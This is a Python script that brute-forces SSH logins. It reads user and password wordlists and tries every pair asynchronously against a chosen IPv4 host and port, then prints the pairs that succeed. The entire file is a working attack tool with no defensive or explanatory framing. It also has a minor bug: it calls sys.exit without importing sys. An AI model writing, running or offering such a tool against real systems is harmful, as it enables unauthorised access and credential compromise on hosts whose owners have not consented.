import asyncio
from asyncio import CancelledError
import asyncssh
import argparse
import ipaddress
import time

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--ip", required=True, help = "IPv4 address of the target host")
parser.add_argument("-t", "--tasks", type=int, default=2, help = "Maximum number of tasks at once.")
parser.add_argument("-u", "--user-list", required=True, help = "User list.")
parser.add_argument("-p", "--password-list", required=True, help = "Password list.")
parser.add_argument("-P", "--port", type=int, default=22, help = "Alternative SSH port.")
args = parser.parse_args()

successful_logins = []

try:
    ip = ipaddress.IPv4Address(args.ip)
except ipaddress.AddressValueError:
    print(f"Invalid IP address: {args.ip}")
    sys.exit(1)


async def reading_wordlists():
    with open(args.user_list, "r") as u:
        users = [line.strip() for line in u if line.strip()]
    with open(args.password_list, "r") as p:
        passwords = [line.strip() for line in p if line.strip()]          
    return users, passwords    

async def brute_force(semaphore, usr, passw):
    async with semaphore:  
        try:
            conn = await asyncssh.connect(host=args.ip, port=args.port, known_hosts=None, username=usr, password=passw)
            conn.close()
            await conn.wait_closed()
        except asyncssh.PermissionDenied:
            print(f"[-] Incorrect login: {usr}:{passw} ")
        else:
            successful_logins.append((usr, passw))  
            print(f"[+] Succesful login: {usr}:{passw}")


async def main():
    semaphore = asyncio.Semaphore(args.tasks) 
    users, passwords = await reading_wordlists()
    try:
        async with asyncio.TaskGroup() as tg:
            for u in users:
                for p in passwords:            
                    task = tg.create_task(brute_force(semaphore, u, p))
    except CancelledError:
        print("Task has been cancelled")    
    print("[+] Correct logins:")
    for username, password in successful_logins:
        print(f"{username}:{password}")


if __name__ ==  '__main__':
    try:
        start = time.time()
        asyncio.run(main())
    except (KeyboardInterrupt):
        print("Stopped")   
    finally:
        end = time.time()
        duration = end - start    

